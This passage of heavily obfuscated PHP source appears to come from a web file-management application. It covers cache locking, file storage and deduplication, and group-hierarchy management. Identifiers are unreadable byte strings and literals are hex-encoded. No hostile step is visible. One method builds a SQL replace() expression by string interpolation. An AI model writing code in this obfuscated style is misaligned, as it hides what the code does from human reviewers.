self::$caches[$È¶×á‰ì]; if (!$©ğÃô»ˆ) { return; } @flock($©ğÃô»ˆ[$´¨ùû‰[916]], LOCK_UN); @fclose($©ğÃô»ˆ[$´¨ùû‰[916]]); @unlink($©ğÃô»ˆ[$´¨ùû‰[231]]); unset(self::$caches[$È¶×á‰ì]); } } class CacheLockRedis { public function lock($˜Êö»´á, $Óœ¿÷Ì = 10) { $ôóÉ„ô™ = Cache::init(); $¡®é¯ = microtime(!0) + $Óœ¿÷Ì; while (microtime(!0) < $¡®é¯) { $•º‚ÌµÜ = $ôóÉ„ô™->get($˜Êö»´á); if (!$•º‚ÌµÜ) { $Ë¶½¼İˆ = $ôóÉ„ô™->setLock($˜Êö»´á, $¡®é¯, $Óœ¿÷Ì); if ($Ë¶½¼İˆ) { return !0; } } else { if ($•º‚ÌµÜ < microtime(!0)) { $ôóÉ„ô™->set($˜Êö»´á, $¡®é¯, $Óœ¿÷Ì * 2); if ($ôóÉ„ô™->get($˜Êö»´á) === $•º‚ÌµÜ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($‡ôØÈíÃ) { return Cache::init()->get($‡ôØÈíÃ); } public function unlock($º–úœ“§) { return Cache::init()->remove($º–úœ“§); } } class CacheLockMemcached { public function lock($‚¥å½øÇ, $Û·Ò»¦ò = 0) { $Õ€ß”İ„ = Cache::init(); $ğÜ•ÁŸ­ = microtime(!0) + $Û·Ò»¦ò; while (microtime(!0) < $ğÜ•ÁŸ­) { $€µ¾‚Î = $Õ€ß”İ„->get($‚¥å½øÇ); if (!$€µ¾‚Î || $€µ¾‚Î < microtime(!0)) { $ş¸á»ÎÛ = $Õ€ß”İ„->handle->add($‚¥å½øÇ, $ğÜ•ÁŸ­, $Û·Ò»¦ò); if ($ş¸á»ÎÛ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Õ’Ë’) { return Cache::init()->get($Õ’Ë’); } public function unlock($“×ö¼õ’) { return Cache::init()->remove($“×ö¼õ’); } } goto c¸ç¡“¸ÌÆ; c…•À„Î: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\145"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\141\x6d\x65" => "\x69\157\x5f\146\x69\x6c\145\x5f\x6d\145\164\141", "\155\145\x74\141\106\x69\145\154\x64" => "\146\151\154\x65\x49\104"); public function fileInfo($ÃÌãÔ†Í) { $”¼Åæ¿Å =& $_SERVER[Õò”†—·]; static $íÒ´Ä¹› = array(); if (!isset($íÒ´Ä¹›[$ÃÌãÔ†Í])) { $ë¼¦…‚ö = $”¼Åæ¿Å[2003]; $áœ¶Ğ« = Model($”¼Åæ¿Å[528])->field($ë¼¦…‚ö)->where(array($”¼Åæ¿Å[526] => $ÃÌãÔ†Í))->find(); $íÒ´Ä¹›[$ÃÌãÔ†Í] = $áœ¶Ğ«; } return $íÒ´Ä¹›[$ÃÌãÔ†Í]; } public function addFileByContent($ÓÀß„©Ë = '', $÷­³ÃµË = '') { $Ú½²ô˜Ó =& $_SERVER[Õò”†—·]; $³·øÕ = TEMP_PATH . $Ú½²ô˜Ó[2004]; if (!is_dir($³·øÕ)) { mk_dir($³·øÕ); } $˜¦ª÷Øõ = $³·øÕ . $Ú½²ô˜Ó[2005] . rand_string(16); file_put_contents($˜¦ª÷Øõ, $ÓÀß„©Ë); $çÕª¡èÚ = $this->addFile($˜¦ª÷Øõ, $÷­³ÃµË, !0); if (file_exists($˜¦ª÷Øõ)) { @unlink($˜¦ª÷Øõ); } return $çÕª¡èÚ; } public function createFileName($©Ç¦Ïş, $é÷’©ÆÂ = false, $“½«ŞÅ› = false) { $Ğ‡çş÷¨ =& $_SERVER[Õò”†—·]; $à¦º­Å = IO::init($Ğ‡çş÷¨[18]); $ó¸ü»ıù = $this->makeFilePath($©Ç¦Ïş, $à¦º­Å, $é÷’©ÆÂ, $“½«ŞÅ›); $©ÀåÏÑ× = $à¦º­Å->pathFather($ó¸ü»ıù); static $ŠÂ€É©í = false; $§ÎĞ—ŒÁ = $Ğ‡çş÷¨[2006] . md5($©ÀåÏÑ×); if (!$ŠÂ€É©í && !Cache::get($§ÎĞ—ŒÁ)) { $ŠÂ€É©í = !0; $‘ò¨²­± = IO::mkdir($©ÀåÏÑ×); if (!IO::exist($‘ò¨²­± . $Ğ‡çş÷¨[847])) { IO::mkfile($‘ò¨²­± . $Ğ‡çş÷¨[847]); } Cache::set($§ÎĞ—ŒÁ, 1, 3600 * 2); } return $ó¸ü»ıù; } public function makeFilePath($©ó…¢ëì, $…äÇÃ·¤, $ª¿ä¸ÁÚ = false, $¤êæ¼é = false) { $úô¨¨àê =& $_SERVER[Õò”†—·]; $í¦–áÎ© = Model($úô¨¨àê[821])->get($úô¨¨àê[2007]); $¿éÍ²Ú° = KodIO::defaultIO() . date($úô¨¨àê[2008]); $øè÷¨Û² = $¿éÍ²Ú° . rand_string(5) . short_id(100); $©ó…¢ëì = str_replace($úô¨¨àê[18], $úô¨¨àê[21], KodIO::clear($©ó…¢ëì)); $ñİæßÕï = $…äÇÃ·¤->ext($©ó…¢ëì); if (!$©ó…¢ëì) { $í¦–áÎ© = $úô¨¨àê[2009]; } switch ($í¦–áÎ©) { case $úô¨¨àê[2010]: if ($ñİæßÕï) { $øè÷¨Û² = $øè÷¨Û² . $úô¨¨àê[20] . $ñİæßÕï; } if ($ñİæßÕï == $úô¨¨àê[1946]) { $øè÷¨Û² .= $úô¨¨àê[1260]; } break; case $úô¨¨àê[2011]: $î„İŠ£ = Model($úô¨¨àê[821])->get($úô¨¨àê[822]); $î¼Åşü = substr(md5($úô¨¨àê[823] . $î„İŠ£ . date($úô¨¨àê[799])), 0, 8); $‰¤Óµ»ß = KodIO::defaultDriver(); $¿éÍ²Ú° = $úô¨¨àê[1291] . $‰¤Óµ»ß[$úô¨¨àê[459]] . $úô¨¨àê[468] . date($úô¨¨àê[2012]) . $î¼Åşü . $úô¨¨àê[18]; if ($ñİæßÕï == $úô¨¨àê[1946]) { $©ó…¢ëì .= $úô¨¨àê[1260]; } $ïŸôÇ‡ƒ = $úô¨¨àê[2013] . $¿éÍ²Ú° . $©ó…¢ëì; CacheLock::lock($ïŸôÇ‡ƒ); $øè÷¨Û² = $¿éÍ²Ú° . $©ó…¢ëì; if (IO::exist($¿éÍ²Ú° . $©ó…¢ëì)) { $¢½Ğ‰Îà = substr($©ó…¢ëì, 0, strlen($©ó…¢ëì) - strlen($ñİæßÕï)); $­¼±ğ = $¤êæ¼é ? substr($¤êæ¼é, 0, 5) : ($ª¿ä¸ÁÚ ? substr($ª¿ä¸ÁÚ, 0, 5) : rand_string(5)); $øè÷¨Û² = $¿éÍ²Ú° . $¢½Ğ‰Îà . $­¼±ğ; if ($ñİæßÕï) { $øè÷¨Û² = $øè÷¨Û² . $úô¨¨àê[20] . $ñİæßÕï; } } if (IO::isOsDriver($øè÷¨Û²) && !IO::isUploadServer($øè÷¨Û²)) { if (IO::exist($øè÷¨Û²)) { return $øè÷¨Û²; } $³ÑØ µ = IO::setContent($øè÷¨Û², $úô¨¨àê[22]); if (!$³ÑØ µ) { show_json($úô¨¨àê[2014], !1); } } CacheLock::unlock($ïŸôÇ‡ƒ); break; case $úô¨¨àê[2009]: break; default: break; } return $øè÷¨Û²; } public function addFileByRemote($…¤İÇ¾‹, $Èš‘©€Í, $¿Ê¤Å´„ = array()) { $Âã¹ÕŒ =& $_SERVER[Õò”†—·]; if (!IO::exist($…¤İÇ¾‹)) { return !1; } $ùË¸àÎô = $¿Ê¤Å´„[$Âã¹ÕŒ[531]] ? $¿Ê¤Å´„[$Âã¹ÕŒ[531]] : $Âã¹ÕŒ[22]; $‡˜Õğç÷ = IO::hashMd5($…¤İÇ¾‹, $ùË¸àÎô); $¡‚ª»è = KodIO::defaultDriver(); $Ğ·„¥ÔÎ = array($Âã¹ÕŒ[601] => IO::size($…¤İÇ¾‹), $Âã¹ÕŒ[2015] => 1, $Âã¹ÕŒ[478] => $Èš‘©€Í, $Âã¹ÕŒ[858] => $¡‚ª»è[$Âã¹ÕŒ[459]], $Âã¹ÕŒ[479] => $…¤İÇ¾‹, $Âã¹ÕŒ[2016] => $¿Ê¤Å´„[$Âã¹ÕŒ[656]] ? $¿Ê¤Å´„[$Âã¹ÕŒ[656]] : IO::hashSimple($…¤İÇ¾‹), $Âã¹ÕŒ[2017] => $‡˜Õğç÷ ? $‡˜Õğç÷ : $ùË¸àÎô); if ($á×Œø¯› = $this->addFileCheckExist($Ğ·„¥ÔÎ[$Âã¹ÕŒ[656]], $Ğ·„¥ÔÎ[$Âã¹ÕŒ[531]], $Ğ·„¥ÔÎ[$Âã¹ÕŒ[89]])) { return $á×Œø¯›; } return $this->addFileData($Ğ·„¥ÔÎ); } private function addFileData($•ùÕ»Ç) { $Õüğˆ±½ =& $_SERVER[Õò”†—·]; if (!$•ùÕ»Ç) { return !1; } $•ùÕ»Ç[$Õüğˆ±½[89]] = intval($•ùÕ»Ç[$Õüğˆ±½[89]]); if (!$•ùÕ»Ç[$Õüğˆ±½[89]] && strlen($•ùÕ»Ç[$Õüğˆ±½[656]]) > 32) { $•ùÕ»Ç[$Õüğˆ±½[89]] = intval(substr($•ùÕ»Ç[$Õüğˆ±½[656]], 32)); } $¢ç“¨® = $this->add($•ùÕ»Ç); return $this->find($¢ç“¨®); } public function addFile($é·Š‡©, $Ë°óïáŠ, $¡Ë¶ŠĞ = false) { $±«­Í =& $_SERVER[Õò”†—·]; $á‡†ÙÂ = IO::hashSimple($é·Š‡©); $Ôö¨Ğßé = IO::size($é·Š‡©); $éåÀö– = $Ôö¨Ğßé <= 1024 * 1024 * 10 ? IO::hashMd5($é·Š‡©) : $±«­Í[22]; $Õ¯Ü¸ø = $±«­Í[2018] . $á‡†ÙÂ; CacheLock::lock($Õ¯Ü¸ø); if ($éåÀö– && $á‡†ÙÂ) { $Ú¯ŠÉÄç = $this->addFileCheckExist($á‡†ÙÂ, $éåÀö–, $Ôö¨Ğßé); if ($Ú¯ŠÉÄç) { CacheLock::unlock($Õ¯Ü¸ø); return $Ú¯ŠÉÄç; } } $¤Ú‰ì™º = $this->addFileMake($é·Š‡©, $Ôö¨Ğßé, $á‡†ÙÂ, $éåÀö–, $Ë°óïáŠ, $¡Ë¶ŠĞ); $ëŞåîïû = $this->addFileData($¤Ú‰ì™º); CacheLock::unlock($Õ¯Ü¸ø); if (!$éåÀö– && $ëŞåîïû) { $this->fileMd5Check($ëŞåîïû); } return $ëŞåîïû; } public function fileMd5Check($ëÛßÆú) { $½³Å¾ä€ =& $_SERVER[Õò”†—·]; $…„÷æ¿› = array($ëÛßÆú[$½³Å¾ä€[525]], $ëÛßÆú[$½³Å¾ä€[97]]); $Æ“æ¤¦ = $½³Å¾ä€[2019] . $ëÛßÆú[$½³Å¾ä€[97]]; $Ø»ãŠÊ = $½³Å¾ä€[2020] . $ëÛßÆú[$½³Å¾ä€[525]]; TaskQueue::add($½³Å¾ä€[2021], $…„÷æ¿›, $Æ“æ¤¦, $Ø»ãŠÊ); } public function fileMd5Set($¿ääå´, $ƒ¶ĞïÊì) { $¬½ê„Ó =& $_SERVER[Õò”†—·]; $¥ ·óÌİ = $this->find($¿ääå´); if (!$¥ ·óÌİ || $¥ ·óÌİ[$¬½ê„Ó[531]]) { return; } $”»ÚÎÚ = IO::hashMd5($ƒ¶ĞïÊì); if (!$”»ÚÎÚ) { return $¬½ê„Ó[22]; } $this->where(array($¬½ê„Ó[525] => $¿ääå´))->save(array($¬½ê„Ó[531] => $”»ÚÎÚ)); } public function addFileMake($‚Ø“Ã§, $Ãö¬›Õê, $©›öŠ‹¿, $×ÕÄ–õ, $›ğÌ—ã˜, $öŞÉ›Ç) { $¦Ô‹ã‘ñ =& $_SERVER[Õò”†—·]; $£±€°¥Ğ = $this->createFileName($›ğÌ—ã˜, $©›öŠ‹¿, $×ÕÄ–õ); $¾ç²Ã¦ô = get_path_father($£±€°¥Ğ); $£üšØï€ = get_path_this($£±€°¥Ğ); if ($öŞÉ›Ç) { $³æ“ñö = IO::move($‚Ø“Ã§, $¾ç²Ã¦ô, !1, $£üšØï€); } else { $³æ“ñö = IO::copy($‚Ø“Ã§, $¾ç²Ã¦ô, !1, $£üšØï€); } if (!$³æ“ñö) { return !1; } $Î–Ò›ø” = KodIO::defaultDriver(); $ĞĞ´²™î = array($¦Ô‹ã‘ñ[601] => $Ãö¬›Õê, $¦Ô‹ã‘ñ[2015] => 1, $¦Ô‹ã‘ñ[478] => $›ğÌ—ã˜, $¦Ô‹ã‘ñ[858] => $Î–Ò›ø”[$¦Ô‹ã‘ñ[459]], $¦Ô‹ã‘ñ[479] => $£±€°¥Ğ, $¦Ô‹ã‘ñ[2016] => $©›öŠ‹¿, $¦Ô‹ã‘ñ[2017] => $×ÕÄ–õ); return $ĞĞ´²™î; } public function addFileCheckExist($Ú·â–ï€, $Àü‰¶«æ, $ŒË˜„ºº) { $ñË¥ùå‚ =& $_SERVER[Õò”†—·]; $ŠÑû—ú = $this->findByHash($Ú·â–ï€, $Àü‰¶«æ); if (!$ŠÑû—ú) { return !1; } $ªŒ“˜à = array($ñË¥ùå‚[2015] => intval($ŠÑû—ú[$ñË¥ùå‚[2022]]) + 1, $ñË¥ùå‚[601] => $ŒË˜„ºº); $this->where(array($ñË¥ùå‚[526] => $ŠÑû—ú[$ñË¥ùå‚[525]]))->save($ªŒ“˜à); return $ŠÑû—ú; } public function remove($Í–øèèÄ) { $this->linkCountChange($Í–øèèÄ, !1); $this->clearEmpty(); return !0; } public function linkAdd($â·ªØ¯) { $this->linkCountChange($â·ªØ¯, !0); } public function linkCountChange($øˆ©”°‹, $†ûùš–â) { $ª÷¢Ö„¢ =& $_SERVER[Õò”†—·]; if (!$øˆ©”°‹) { return; } if (!is_array($øˆ©”°‹)) { $øˆ©”°‹ = array($øˆ©”°‹); } $øçĞº¦Ğ = array(); foreach ($øˆ©”°‹ as $‰¼ŠÊı) { $èùòõÑ = $‰¼ŠÊı . $ª÷¢Ö„¢[22]; if (!$øçĞº¦Ğ[$èùòõÑ]) { $øçĞº¦Ğ[$èùòõÑ] = 0; } $øçĞº¦Ğ[$èùòõÑ]++; } $³¾ª°ìÅ = array(); foreach ($øçĞº¦Ğ as $‰¼ŠÊı => $ÛÔ¨Âú†) { $èùòõÑ = $ÛÔ¨Âú† . $ª÷¢Ö„¢[22]; if (!$³¾ª°ìÅ[$èùòõÑ]) { $³¾ª°ìÅ[$èùòõÑ] = array(); } $³¾ª°ìÅ[$èùòõÑ][] = $‰¼ŠÊı; } foreach ($³¾ª°ìÅ as $ÛÔ¨Âú† => $Æ¥³©Òê) { if (!$Æ¥³©Òê) { continue; } $ÛÔ¨Âú† = $†ûùš–â ? $ÛÔ¨Âú† : -intval($ÛÔ¨Âú†); $‡€É§Ë = array($ª÷¢Ö„¢[525] => array($ª÷¢Ö„¢[17], $Æ¥³©Òê)); if ($ÛÔ¨Âú† < 0) { $‡€É§Ë[$ª÷¢Ö„¢[2022]] = array($ª÷¢Ö„¢[1065], abs($ÛÔ¨Âú†)); } $this->where($‡€É§Ë)->setAdd($ª÷¢Ö„¢[2022], $ÛÔ¨Âú†); } } public function findByHash($Å‹Àæ®í, $¸·§Öæñ = false) { $³Ü™•äÌ =& $_SERVER[Õò”†—·]; if (!$Å‹Àæ®í && !$¸·§Öæñ) { return !1; } $¹£”§ğÔ = array($³Ü™•äÌ[2016] => $Å‹Àæ®í); if ($¸·§Öæñ) { $¹£”§ğÔ = array($³Ü™•äÌ[2017] => $¸·§Öæñ); } return $this->order($³Ü™•äÌ[2023])->where($¹£”§ğÔ)->find(); } public function clearEmpty($Æã³çüó = 0) { $ÉäÏîÜ‹ =& $_SERVER[Õò”†—·]; $ÔÛ„¼“° = time() - 3600 * 24 * $Æã³çüó; $·û¢ğú¨ = $ÉäÏîÜ‹[2024] . $ÔÛ„¼“°; $§Œö™ö¤ = $this->where($·û¢ğú¨)->select(); if (!$§Œö™ö¤) { return; } $ğİŸ„ÎÂ = new Task($ÉäÏîÜ‹[2025], $ÉäÏîÜ‹[22], count($§Œö™ö¤)); foreach ($§Œö™ö¤ as $†Å¨•ó†) { $ğİŸ„ÎÂ->update(1); $this->resetFile($†Å¨•ó†); } $ğİŸ„ÎÂ->end(); } public function resetFile($ş÷£•Á²) { $ÁíÃ‚ù³ =& $_SERVER[Õò”†—·]; $´½ğÌ¥ = array($ÁíÃ‚ù³[526] => $ş÷£•Á²[$ÁíÃ‚ù³[525]]); $³ÏøĞÚ” = Model($ÁíÃ‚ù³[1388])->where($´½ğÌ¥)->count(); $ÖÀş° Æ = Model($ÁíÃ‚ù³[2026])->where($´½ğÌ¥)->count(); $…æ˜’Ú = intval($³ÏøĞÚ”) + intval($ÖÀş° Æ); if ($…æ˜’Ú == 0) { IO::remove($ş÷£•Á²[$ÁíÃ‚ù³[97]]); Model($ÁíÃ‚ù³[2027])->delete($ş÷£•Á²[$ÁíÃ‚ù³[525]]); $this->where($´½ğÌ¥)->delete(); $this->metaSet($ş÷£•Á²[$ÁíÃ‚ù³[525]], null, null); write_log(ACTION . $ÁíÃ‚ù³[2028] . KodUser::id() . $ÁíÃ‚ù³[2029] . $ş÷£•Á²[$ÁíÃ‚ù³[525]] . $ÁíÃ‚ù³[2030] . $ş÷£•Á²[$ÁíÃ‚ù³[89]] . $ÁíÃ‚ù³[202] . $ş÷£•Á²[$ÁíÃ‚ù³[97]], $ÁíÃ‚ù³[2031]); return; } if ($ş÷£•Á²[$ÁíÃ‚ù³[2022]] != $…æ˜’Ú) { $this->where($´½ğÌ¥)->save(array($ÁíÃ‚ù³[2015] => $…æ˜’Ú)); } } public function storageInfo($¥…‡ÕÀ¶ = false) { $ÉïéÈËŞ =& $_SERVER[Õò”†—·]; $âûÄÅ„„ = $this->count() + 0.0; $î‚İíÍÌ = 0; $ÕñéŠ·— = 1; $¯êó€…Ú = 0; $Ì÷œŠÑğ = 5000; for ($ÃµÈÑèî = 0; $ÃµÈÑèî < $âûÄÅ„„; $ÃµÈÑèî = $ÃµÈÑèî + $Ì÷œŠÑğ) { $Êİ£è„Ó = $this->limit($ÃµÈÑèî, $ÃµÈÑèî + $Ì÷œŠÑğ)->select(); foreach ($Êİ£è„Ó as $ƒôàŞâ) { $ÕñéŠ·— += $ƒôàŞâ[$ÉïéÈËŞ[89]] * $ƒôàŞâ[$ÉïéÈËŞ[2022]]; $î‚İíÍÌ += $ƒôàŞâ[$ÉïéÈËŞ[89]] * ($ƒôàŞâ[$ÉïéÈËŞ[2022]] - 1); $¯êó€…Ú += $ƒôàŞâ[$ÉïéÈËŞ[2022]]; } } $ìš«ßÒÍ = array($ÉïéÈËŞ[2032] => $ÕñéŠ·—, $ÉïéÈËŞ[2033] => $î‚İíÍÌ, $ÉïéÈËŞ[2034] => $î‚İíÍÌ / $ÕñéŠ·—, $ÉïéÈËŞ[93] => $âûÄÅ„„, $ÉïéÈËŞ[2035] => $¯êó€…Ú); return $ìš«ßÒÍ; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\x67\x72\x6f\165\x70\x5f\155\145\x74\141", "\x6d\x65\164\141\x46\151\145\154\x64" => "\x67\162\157\165\x70\x49\x44"); protected function cacheFunctionAlias($’àáç»¤) { $‡ıˆüâ =& $_SERVER[Õò”†—·]; return array($‡ıˆüâ[2036] => array($’àáç»¤[0], $‡ıˆüâ[2037]), $‡ıˆüâ[2038] => array($’àáç»¤[0], $‡ıˆüâ[2039])); } protected function getInfo($áÑıêù€, $ãêÅóÊÁ = false) { $œïéšÒê = $this->getInfoSimple($áÑıêù€); if (!$œïéšÒê) { return !1; } if ($ãêÅóÊÁ) { return $this->_listDataApplyItem($œïéšÒê); } return $this->cacheFunctionGet($_SERVER[Õò”†—·][2040], $áÑıêù€); } protected function getInfoSimple($º›å¹ĞË, $‚Š¼®¿Ú = false) { $›ä¼¼Ø˜ =& $_SERVER[Õò”†—·]; if ($‚Š¼®¿Ú) { $ªÂ†‘¯è = array($›ä¼¼Ø˜[1953] => intval($º›å¹ĞË)); $²ğİéã” = $this->where($ªÂ†‘¯è)->find(); return is_array($²ğİéã”) ? $²ğİéã” : array(); } return $this->cacheFunctionGet($›ä¼¼Ø˜[2041], $º›å¹ĞË); } protected function groupAdd($¢‘©Šç…) { $ĞÍ Î÷¶ =& $_SERVER[Õò”†—·]; if (!$¢‘©Šç…[$ĞÍ Î÷¶[193]] && isset($¢‘©Šç…[$ĞÍ Î÷¶[1953]]) && $¢‘©Šç…[$ĞÍ Î÷¶[1953]] == 1) { if ($…šÔòÍî = $this->getInfoSimple($¢‘©Šç…[$ĞÍ Î÷¶[1953]], !0)) { return $¢‘©Šç…[$ĞÍ Î÷¶[1953]]; } } else { $…šÔòÍî = $this->getInfoSimple($¢‘©Šç…[$ĞÍ Î÷¶[193]]); if (!$…šÔòÍî) { return !1; } } $öµŞàÙû = $ĞÍ Î÷¶[579]; if ($…šÔòÍî[$ĞÍ Î÷¶[569]]) { $öµŞàÙû = $…šÔòÍî[$ĞÍ Î÷¶[569]] . $…šÔòÍî[$ĞÍ Î÷¶[1953]] . $ĞÍ Î÷¶[60]; } $‰ÙõŠß = array($ĞÍ Î÷¶[478] => $this->groupNameAuto($¢‘©Šç…[$ĞÍ Î÷¶[193]], $¢‘©Šç…[$ĞÍ Î÷¶[42]]), $ĞÍ Î÷¶[461] => $¢‘©Šç…[$ĞÍ Î÷¶[193]], $ĞÍ Î÷¶[636] => $öµŞàÙû, $ĞÍ Î÷¶[2042] => $¢‘©Šç…[$ĞÍ Î÷¶[1940]], $ĞÍ Î÷¶[2043] => 0, $ĞÍ Î÷¶[1957] => 0); if (isset($¢‘©Šç…[$ĞÍ Î÷¶[1977]])) { $‰ÙõŠß[$ĞÍ Î÷¶[1977]] = $¢‘©Šç…[$ĞÍ Î÷¶[1977]]; } else { $åäË ˆ• = $this->max($ĞÍ Î÷¶[1977]); if (!$åäË ˆ•) { $åäË ˆ• = 0; } $‰ÙõŠß[$ĞÍ Î÷¶[1977]] = $åäË ˆ• + 1; } if (!empty($¢‘©Šç…[$ĞÍ Î÷¶[1953]])) { $‰ÙõŠß[$ĞÍ Î÷¶[1953]] = $¢‘©Šç…[$ĞÍ Î÷¶[1953]]; } $×Ğ†óÃ = $this->add($‰ÙõŠß); $this->setNamePinyin($×Ğ†óÃ, $‰ÙõŠß[$ĞÍ Î÷¶[42]]); if (isset($¢‘©Šç…[$ĞÍ Î÷¶[2044]])) { $this->metaSet($×Ğ†óÃ, array($ĞÍ Î÷¶[2044] => $¢‘©Šç…[$ĞÍ Î÷¶[2044]], $ĞÍ Î÷¶[2045] => $¢‘©Šç…[$ĞÍ Î÷¶[2045]])); unset($¢‘©Šç…[$ĞÍ Î÷¶[2044]]); unset($¢‘©Šç…[$ĞÍ Î÷¶[2045]]); } Model($ĞÍ Î÷¶[1388])->groupRootAdd($×Ğ†óÃ); $this->_clearCache($¢‘©Šç…[$ĞÍ Î÷¶[193]]); return $×Ğ†óÃ; } protected function groupEdit($é°¥§€Ã, $ÆÃ§˜ş³) { $«Õµ€•û =& $_SERVER[Õò”†—·]; $µå©„®À = $this->getInfoSimple($é°¥§€Ã); if (!$µå©„®À) { return !1; } if (!empty($ÆÃ§˜ş³[$«Õµ€•û[193]])) { $Ú“´ñ«á = $this->getInfoSimple($ÆÃ§˜ş³[$«Õµ€•û[193]]); if (!$Ú“´ñ«á) { return !1; } if ($µå©„®À[$«Õµ€•û[1953]] == $Ú“´ñ«á[$«Õµ€•û[1953]]) { return !1; } if ($ÆÃ§˜ş³[$«Õµ€•û[193]] != $µå©„®À[$«Õµ€•û[193]]) { if ($Ú“´ñ«á[$«Õµ€•û[569]] !== $µå©„®À[$«Õµ€•û[569]] && strpos($Ú“´ñ«á[$«Õµ€•û[569]], $µå©„®À[$«Õµ€•û[569]] . $µå©„®À[$«Õµ€•û[1953]] . $«Õµ€•û[60]) === 0) { return !1; } $ÆÃ§˜ş³[$«Õµ€•û[636]] = $Ú“´ñ«á[$«Õµ€•û[569]] . $ÆÃ§˜ş³[$«Õµ€•û[193]] . $«Õµ€•û[60]; $this->_changeChildLevel($µå©„®À, $Ú“´ñ«á); $this->_clearCache($Ú“´ñ«á[$«Õµ€•û[1953]]); $this->_clearCache($µå©„®À[$«Õµ€•û[193]]); } } if (isset($ÆÃ§˜ş³[$«Õµ€•û[42]])) { $this->setNamePinyin($é°¥§€Ã, $ÆÃ§˜ş³[$«Õµ€•û[42]]); } if (isset($ÆÃ§˜ş³[$«Õµ€•û[2044]])) { $this->metaSet($é°¥§€Ã, array($«Õµ€•û[2044] => $ÆÃ§˜ş³[$«Õµ€•û[2044]], $«Õµ€•û[2045] => $ÆÃ§˜ş³[$«Õµ€•û[2045]])); unset($ÆÃ§˜ş³[$«Õµ€•û[2044]]); unset($ÆÃ§˜ş³[$«Õµ€•û[2045]]); } $this->_clearChildrenCache($µå©„®À); return $this->where(array($«Õµ€•û[2046] => $é°¥§€Ã))->save($ÆÃ§˜ş³); } private function _clearChildrenCache($Ã—‘”È¸) { $½ıµ³²º =& $_SERVER[Õò”†—·]; $Ò¹õöÕò = array($½ıµ³²º[636] => array($½ıµ³²º[596], $Ã—‘”È¸[$½ıµ³²º[569]] . $Ã—‘”È¸[$½ıµ³²º[1953]] . $½ıµ³²º[597])); $¾ÔèëØÈ = $this->field($½ıµ³²º[1953])->where($Ò¹õöÕò)->select(); foreach ($¾ÔèëØÈ as $ÙÑÙÜÛ) { $this->_clearCache($ÙÑÙÜÛ[$½ıµ³²º[1953]]); } } private function _clearCache($£ÛûÕÅ²) { $–à¦È§¼ =& $_SERVER[Õò”†—·]; $this->cacheFunctionClear($–à¦È§¼[2040], $£ÛûÕÅ²); $this->cacheFunctionClear($–à¦È§¼[2041], $£ÛûÕÅ²); } private function _changeChildLevel($‚¨…»á¹, $Ó’…é¼Ï, $Â©çˆØù = false) { $´«”¨ºÈ =& $_SERVER[Õò”†—·]; $å­Ô¥‡Â = $‚¨…»á¹[$´«”¨ºÈ[569]] . $‚¨…»á¹[$´«”¨ºÈ[1953]] . $´«”¨ºÈ[60]; $˜°¹Ù„É = $Ó’…é¼Ï[$´«”¨ºÈ[569]] . $Ó’…é¼Ï[$´«”¨ºÈ[1953]] . $´«”¨ºÈ[60] . $‚¨…»á¹[$´«”¨ºÈ[1953]] . $´«”¨ºÈ[60]; if ($Â©çˆØù) { $˜°¹Ù„É = $Ó’…é¼Ï[$´«”¨ºÈ[569]] . $Ó’…é¼Ï[$´«”¨ºÈ[1953]] . $´«”¨ºÈ[60]; } $‡‰«øä¨ = array($´«”¨ºÈ[636] => array($´«”¨ºÈ[596], $‚¨…»á¹[$´«”¨ºÈ[569]] . $‚¨…»á¹[$´«”¨ºÈ[1953]] . $´«”¨ºÈ[597])); $¾Ûäãõî = array($´«”¨ºÈ[636] => array($´«”¨ºÈ[645], "\x72\x65\160\x6c\x61\143\145\x28\160\141\x72\145\156\x74\x4c\x65\166\145\x6c\x2c\x27{$å­Ô¥‡Â}\x27\x2c\47{$˜°¹Ù„É}\47\x29")); $this->_clearChildrenCache($‚¨…»á¹); $this->where($‡‰«øä¨)->data($¾Ûäãõî)->save(); } public function setNamePinyin($˜íµùô, $óáóŞĞ± = false) { $ßÉªÙš  =& $_SERVER[Õò”†—·]; if (!$óáóŞĞ±) { $íŞñùœÉ = $this->getInfoSimple($˜íµùô); $óáóŞĞ± = $íŞñùœÉ[$ßÉªÙš [42]]; } if (!Input::check($óáóŞĞ±, $ßÉªÙš [639])) { $this->metaSet($˜íµùô, $ßÉªÙš [522], null); $this->metaSet($˜íµùô, $ßÉªÙš [521], null); return; } $Å¶Ë”ƒ = array($ßÉªÙš [522] => str_replace($ßÉªÙš [63], $ßÉªÙš [22], Pinyin::get($óáóŞĞ±)), $ßÉªÙš [521] => Pinyin::get($óáóŞĞ±, $ßÉªÙš [640])); $this->metaSet($˜íµùô, $Å¶Ë”ƒ); } protected function groupStatus($‚¯•Õ¡Ü, $¬¦£Ğñæ) { $¤¦“¬ =& $_SERVER[Õò”†—·]; $ç°ãÊÈ“ = $this->getInfoSimple($‚¯•Õ¡Ü); if (!$ç°ãÊÈ“) { return !1; } $this->_clearCache($‚¯•Õ¡Ü); return $this->metaSet($‚¯•Õ¡Ü, $¤¦“¬[801], $¬¦£Ğñæ); if ($¬¦£Ğñæ == $¤¦“¬[101]) { $ÒõÅÕƒá = $this->parentLevelArray($ç°ãÊÈ“[$¤¦“¬[569]]); } else { } $ÒõÅÕƒá[] = $ç°ãÊÈ“[$¤¦“¬[1953]]; $™º…¢Ø = array(); foreach ($ÒõÅÕƒá as $‚¯•Õ¡Ü) { $™º…¢Ø[] = array($¤¦“¬[1953] => $‚¯•Õ¡Ü, $¤¦“¬[107] => $¤¦“¬[801], $¤¦“¬[434] => $¬¦£Ğñæ); $this->_clearCache($‚¯•Õ¡Ü); } return Model($¤¦“¬[2047])->addAll($™º…¢Ø, array(), !0); } protected function groupRemove($ØÌß÷ş, $Éè˜û†í = false) { $¦¬ª…á» =& $_SERVER[Õò”†—·]; $˜ÎèÈë— = array($¦¬ª…á»[1953] => $ØÌß÷ş); $˜Ê‘Ñ¼¡ = $this->where($˜ÎèÈë—)->find(); if (!$˜Ê‘Ñ¼¡ || $˜Ê‘Ñ¼¡[$¦¬ª…á»[193]] == 0) { return !1; } if (!$Éè˜û†í) { $Î°ÂËã = $this->getInfoSimple($˜Ê‘Ñ¼¡[$¦¬ª…á»[193]]); $this->_changeChildLevel($˜Ê‘Ñ¼¡, $Î°ÂËã, !0); 